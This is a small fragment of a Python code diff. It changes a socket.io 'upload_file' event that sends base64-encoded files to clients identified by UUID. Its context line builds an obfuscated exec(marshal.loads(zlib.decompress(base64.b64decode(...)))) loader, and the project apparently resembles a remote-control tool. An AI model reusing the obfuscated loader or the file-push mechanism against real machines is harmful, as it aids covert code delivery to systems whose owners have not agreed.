@@ -209,7 +209,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             print(base64_encoded)
 
         for uuid in data['uuids']:
-            self.sio.emit("upload_file", {'ip': ip, 'file_name': file.filename, 'path': data['path'], 'file': base64_encoded})
+            self.sio.emit("upload_file", {'uuid': uuid, 'file_name': file.filename, 'file': base64_encoded})
 
     
 
